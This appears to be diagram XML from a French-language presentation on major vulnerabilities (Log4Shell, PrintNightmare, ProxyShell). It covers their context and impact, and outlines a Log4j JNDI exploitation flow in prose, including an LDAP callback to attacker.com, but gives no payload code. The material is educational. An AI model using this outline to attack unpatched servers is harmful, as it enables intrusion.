      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="1354069"/>
          <a:ext cx="5334000" cy="1275702"/>
        </a:xfrm>
        <a:prstGeom prst="roundRect">
          <a:avLst/>
        </a:prstGeom>
        <a:solidFill>
          <a:schemeClr val="accent2">
            <a:hueOff val="-753805"/>
            <a:satOff val="-466"/>
            <a:lumOff val="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Contexte :</a:t>
          </a:r>
          <a:br>
            <a:rPr lang="en-GB" sz="2300" kern="1200"/>
          </a:br>
          <a:r>
            <a:rPr lang="en-GB" sz="2300" kern="1200"/>
            <a:t>Vulnérabilité critique dans la bibliothèque Log4j de Java.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2300" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="62275" y="1416344"/>
        <a:ext cx="5209450" cy="1151152"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{82764EFE-C90C-1E45-B6D9-ACE85A4684D4}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="2629771"/>
          <a:ext cx="5334000" cy="856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55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/>
            <a:t>Exploitation par injection de données malveillantes dans les logs.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/>
            <a:t>Accès total au serveur compromis.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1800" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="2629771"/>
        <a:ext cx="5334000" cy="856980"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{7A243271-A2A3-DB4B-9109-C9001ED8C71B}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="3486751"/>
          <a:ext cx="5334000" cy="1275702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Impact :</a:t>
          </a:r>
          <a:br>
            <a:rPr lang="en-GB" sz="2300" kern="1200"/>
          </a:br>
          <a:r>
            <a:rPr lang="en-GB" sz="2300" kern="1200"/>
            <a:t>Affecte des milliers d’applications (par ex., Minecraft, AWS).</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2300" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="62275" y="3549026"/>
        <a:ext cx="5209450" cy="1151152"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{228C12F9-67BF-0947-8CD8-4470018EAD29}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="4762454"/>
          <a:ext cx="5334000" cy="559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55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/>
            <a:t>Exploit facile à reproduire avec des payloads JNDI.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1800" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="4762454"/>
        <a:ext cx="5334000" cy="5594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BC0BEC-B366-FE47-8B1A-F03D8F090FD4}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="1847532" y="1190"/>
          <a:ext cx="7390129" cy="122039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389" tIns="309979" rIns="143389" bIns="3099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Impactant de nombreuses plateformes (services cloud, jeux en ligne).</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1900" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="1847532" y="1190"/>
        <a:ext cx="7390129" cy="1220390"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{02C00511-8A88-1E4B-8F31-67079EE03038}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="1190"/>
          <a:ext cx="1847532" cy="12203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765" tIns="120547" rIns="97765" bIns="120547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Portée universelle :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2300" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="1190"/>
        <a:ext cx="1847532" cy="1220390"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{4E82014A-B7A3-DA4D-BC04-53B4F64590F7}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="1847532" y="1294804"/>
          <a:ext cx="7390129" cy="122039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389" tIns="309979" rIns="143389" bIns="3099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Nécessite peu de compétences techniques pour exécuter un payload.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1900" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="1847532" y="1294804"/>
        <a:ext cx="7390129" cy="1220390"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{2A925559-860F-D74D-9EF0-87C652373DFD}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="1294804"/>
          <a:ext cx="1847532" cy="122039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765" tIns="120547" rIns="97765" bIns="120547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Exploitation facile :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2300" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="1294804"/>
        <a:ext cx="1847532" cy="1220390"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{B7A49A28-272E-8C4C-9377-3FE341BBFF2A}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="1847532" y="2588418"/>
          <a:ext cx="7390129" cy="122039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389" tIns="309979" rIns="143389" bIns="3099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Mise à jour massive des applications vulnérables.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1900" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="1847532" y="2588418"/>
        <a:ext cx="7390129" cy="1220390"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{466DD4A1-2280-9C42-A183-6AC2A086BB4D}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="2588418"/>
          <a:ext cx="1847532" cy="122039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765" tIns="120547" rIns="97765" bIns="120547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Contre-mesures appliquées :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2300" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="2588418"/>
        <a:ext cx="1847532" cy="12203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BD9E75-122D-274F-BFF1-B98D6BA652CC}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="179129"/>
          <a:ext cx="5334000" cy="6715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/>
            <a:t>Requête envoyée :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2800" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="32784" y="211913"/>
        <a:ext cx="5268432" cy="606012"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{6F823EFE-03EE-CE47-B2FA-809C800AC26E}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="850709"/>
          <a:ext cx="5334000" cy="681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55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JNDI établit une connexion LDAP à attacker.com.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2200" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="850709"/>
        <a:ext cx="5334000" cy="681030"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{B7E9DADF-A63E-4248-9FB3-900A4E669D48}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="1531739"/>
          <a:ext cx="5334000" cy="671580"/>
        </a:xfrm>
        <a:prstGeom prst="roundRect">
          <a:avLst/>
        </a:prstGeom>
        <a:solidFill>
          <a:schemeClr val="accent2">
            <a:hueOff val="-502537"/>
            <a:satOff val="-311"/>
            <a:lumOff val="2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/>
            <a:t>Réponse de l’attaquant :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2800" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="32784" y="1564523"/>
        <a:ext cx="5268432" cy="606012"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{B0A77BB7-CE23-0449-989A-FB73371B6954}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="2203319"/>
          <a:ext cx="5334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55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Fournit une référence Java malveillante.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2200" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="2203319"/>
        <a:ext cx="5334000" cy="463680"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{CB496DC4-B639-0649-86E1-F85924EEF741}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="2666999"/>
          <a:ext cx="5334000" cy="671580"/>
        </a:xfrm>
        <a:prstGeom prst="roundRect">
          <a:avLst/>
        </a:prstGeom>
        <a:solidFill>
          <a:schemeClr val="accent2">
            <a:hueOff val="-1005073"/>
            <a:satOff val="-621"/>
            <a:lumOff val="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/>
            <a:t>Chargement en mémoire :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2800" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="32784" y="2699783"/>
        <a:ext cx="5268432" cy="606012"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{85BA686C-D245-2F4B-9A3A-79EC567242A1}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="3338579"/>
          <a:ext cx="53340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55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L’objet est injecté dans la JVM.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2200" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="3338579"/>
        <a:ext cx="5334000" cy="463680"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{2E7F8177-F5A8-F245-BAAA-5C111247D041}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="3802259"/>
          <a:ext cx="5334000" cy="67158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/>
            <a:t>Exécution :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2800" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="32784" y="3835043"/>
        <a:ext cx="5268432" cy="606012"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{45113E57-A351-F143-ADD5-C61FF1B5DF00}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="4473839"/>
          <a:ext cx="5334000" cy="681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55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Les méthodes de l’objet malveillant s’exécutent.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2200" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="4473839"/>
        <a:ext cx="5334000" cy="6810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CC9A4B-77C2-E940-BCEA-B477E17A3DF3}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="27023"/>
          <a:ext cx="5334000" cy="116477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Exemple 2 : PrintNightmare (2021)</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2100" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="56859" y="83882"/>
        <a:ext cx="5220282" cy="1051053"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{8C933FD3-1326-724B-984E-593DBA7E9212}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="1252275"/>
          <a:ext cx="5334000" cy="1164771"/>
        </a:xfrm>
        <a:prstGeom prst="roundRect">
          <a:avLst/>
        </a:prstGeom>
        <a:solidFill>
          <a:schemeClr val="accent2">
            <a:hueOff val="-502537"/>
            <a:satOff val="-311"/>
            <a:lumOff val="2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Contexte :</a:t>
          </a:r>
          <a:br>
            <a:rPr lang="en-GB" sz="2100" kern="1200"/>
          </a:br>
          <a:r>
            <a:rPr lang="en-GB" sz="2100" kern="1200"/>
            <a:t>Failles dans le service d’impression de Windows.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2100" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="56859" y="1309134"/>
        <a:ext cx="5220282" cy="1051053"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{112851AF-E8DD-9F4B-ABE0-F0C20C6D56E6}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="2477527"/>
          <a:ext cx="5334000" cy="1164771"/>
        </a:xfrm>
        <a:prstGeom prst="roundRect">
          <a:avLst/>
        </a:prstGeom>
        <a:solidFill>
          <a:schemeClr val="accent2">
            <a:hueOff val="-1005073"/>
            <a:satOff val="-621"/>
            <a:lumOff val="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Découverte à priori via une lecture du code leak de Windows.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2100" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="56859" y="2534386"/>
        <a:ext cx="5220282" cy="1051053"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{8CA664BC-68C9-4E41-81C0-08072A47687E}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="3642298"/>
          <a:ext cx="5334000" cy="499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5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/>
            <a:t>Permet l’élévation des privilèges jusqu’au niveau administrateur.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1600" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="3642298"/>
        <a:ext cx="5334000" cy="499904"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{F6FB0716-6877-CB4E-AD8F-893235CFA94F}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="4142203"/>
          <a:ext cx="5334000" cy="1164771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Impact :</a:t>
          </a:r>
          <a:br>
            <a:rPr lang="en-GB" sz="2100" kern="1200"/>
          </a:br>
          <a:r>
            <a:rPr lang="en-GB" sz="2100" kern="1200"/>
            <a:t>Exploitable pour propager des ransomwares dans les réseaux.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2100" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="56859" y="4199062"/>
        <a:ext cx="5220282" cy="105105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2922AC-21A0-2945-B264-E38ED33A0FF2}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="419999"/>
          <a:ext cx="9237662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945" tIns="520700" rIns="716945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/>
            <a:t>Une série de failles combinées dans le service d’impression.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2500" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="419999"/>
        <a:ext cx="9237662" cy="1417500"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{51EEE134-9386-924F-813E-349E94A4A9FB}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="461883" y="50999"/>
          <a:ext cx="6466363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413" tIns="0" rIns="24441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Origines multiples :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2500" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="497909" y="87025"/>
        <a:ext cx="6394311" cy="665948"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{EA8FC166-9B44-DC47-8653-FB0DB926AFFF}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="2341499"/>
          <a:ext cx="9237662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6945" tIns="520700" rIns="716945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/>
            <a:t>Microsoft a initialement publié un correctif incomplet, prolongeant la vulnérabilité.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2500" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="2341499"/>
        <a:ext cx="9237662" cy="1417500"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{28B4A214-5E9E-2142-9F14-DB1B5FE3F873}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="461883" y="1972500"/>
          <a:ext cx="6466363" cy="73800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413" tIns="0" rIns="24441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Problèmes de correctifs :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2500" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="497909" y="2008526"/>
        <a:ext cx="6394311" cy="6659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F4E90A-D3C2-194E-B095-1A94C82708C0}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="260309"/>
          <a:ext cx="5334000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Une vulnérabilité critique affectant le </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB" sz="2600" b="1" kern="1200"/>
            <a:t>Windows Print Spooler</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB" sz="2600" kern="1200"/>
            <a:t>.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2600" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="50489" y="310798"/>
        <a:ext cx="5233022" cy="933302"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{F37D602A-B2B7-5942-98FF-A5138D2A0F0A}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="1294589"/>
          <a:ext cx="5334000" cy="1237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5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Permet l'exécution de code à distance (RCE) et/ou l'élévation de privilèges (LPE).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Références principales : </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB" sz="2000" b="1" kern="1200"/>
            <a:t>CVE-2021-34527</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB" sz="2000" kern="1200"/>
            <a:t>, </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB" sz="2000" b="1" kern="1200"/>
            <a:t>CVE-2021-1675</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB" sz="2000" kern="1200"/>
            <a:t>.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2000" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="1294589"/>
        <a:ext cx="5334000" cy="1237860"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{4845A103-8561-A24B-B057-46A5958AE552}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="2532449"/>
          <a:ext cx="5334000" cy="103428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kern="1200"/>
            <a:t>Impact :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2600" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="50489" y="2582938"/>
        <a:ext cx="5233022" cy="933302"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{D6A5A331-7DEA-2141-B065-21515FE79B2D}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="3566729"/>
          <a:ext cx="5334000" cy="150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5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Présente sur de nombreuses versions de Windows, incluant des serveurs.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Exploitable même dans des environnements internes avec des configurations par défaut.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2000" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="3566729"/>
        <a:ext cx="5334000" cy="15069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051B07-221A-754D-BAA5-81F43E2E7693}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="440617"/>
          <a:ext cx="5334000" cy="127570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Exemple 3 : ProxyShell (2021)</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2300" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="62275" y="502892"/>
        <a:ext cx="5209450" cy="1151152"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{04E5EAA8-89F6-8842-B3DD-61F42376F082}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="1782559"/>
          <a:ext cx="5334000" cy="1275702"/>
        </a:xfrm>
        <a:prstGeom prst="roundRect">
          <a:avLst/>
        </a:prstGeom>
        <a:solidFill>
          <a:schemeClr val="accent2">
            <a:hueOff val="-753805"/>
            <a:satOff val="-466"/>
            <a:lumOff val="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Contexte :</a:t>
          </a:r>
          <a:br>
            <a:rPr lang="en-GB" sz="2300" kern="1200"/>
          </a:br>
          <a:r>
            <a:rPr lang="en-GB" sz="2300" kern="1200"/>
            <a:t>Vulnérabilités affectant Microsoft Exchange Server.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2300" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="62275" y="1844834"/>
        <a:ext cx="5209450" cy="1151152"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{B2ED4D58-9864-DB42-B51A-BAB7F860F017}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="3058261"/>
          <a:ext cx="5334000" cy="559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55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/>
            <a:t>Exploitation en trois étapes : pré-authentification, contrôle et exécution de commandes.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1800" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="3058261"/>
        <a:ext cx="5334000" cy="559417"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{B9574AF1-FF0A-404D-8153-4838480E45DC}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="3617679"/>
          <a:ext cx="5334000" cy="1275702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Impact :</a:t>
          </a:r>
          <a:br>
            <a:rPr lang="en-GB" sz="2300" kern="1200"/>
          </a:br>
          <a:r>
            <a:rPr lang="en-GB" sz="2300" kern="1200"/>
            <a:t>Utilisé massivement par des attaquants pour installer des backdoors.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2300" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="62275" y="3679954"/>
        <a:ext cx="5209450" cy="115115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2A7DA1-CAB9-41A5-90CD-DAE07739DDED}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="1382733" y="226218"/>
          <a:ext cx="1485421" cy="14854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B7896-7BA2-43F8-98A8-2AB1EBEE1E9A}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="3413" y="1856015"/>
          <a:ext cx="4244062" cy="636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b="1" kern="1200"/>
            <a:t>Architecture ciblée :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="3600" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="3413" y="1856015"/>
        <a:ext cx="4244062" cy="636609"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{4E7CEB91-911B-47F2-9D38-9F01F4C1D7FD}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="3413" y="2559776"/>
          <a:ext cx="4244062" cy="1024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Services Microsoft Exchange exposés en ligne (OWA, ECP, etc.).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Ports standards : 443 (HTTPS), 80 (HTTP).</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1700" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="3413" y="2559776"/>
        <a:ext cx="4244062" cy="1024004"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{85F40EB9-588C-4F33-956B-E17F78729D83}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="6369506" y="226218"/>
          <a:ext cx="1485421" cy="14854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474B6-A3B4-4734-B4AA-86FE46F6853E}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="4990186" y="1856015"/>
          <a:ext cx="4244062" cy="636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b="1" kern="1200"/>
            <a:t>But de l’attaque :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="3600" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="4990186" y="1856015"/>
        <a:ext cx="4244062" cy="636609"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{5C1CB02F-CCBD-4716-9C04-C8C47314D1DD}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="4990186" y="2559776"/>
          <a:ext cx="4244062" cy="1024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Exploiter des failles dans l’interface entre le client et les services backend.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Obtenir une session non authentifiée pour exécuter du code malveillant.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1700" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="4990186" y="2559776"/>
        <a:ext cx="4244062" cy="102400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6A45D2-96A5-49BE-B1AF-37870970ECAA}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="619125"/>
          <a:ext cx="9237662" cy="11429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D5DF0E-9CBB-407B-A557-494D77EE08E1}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
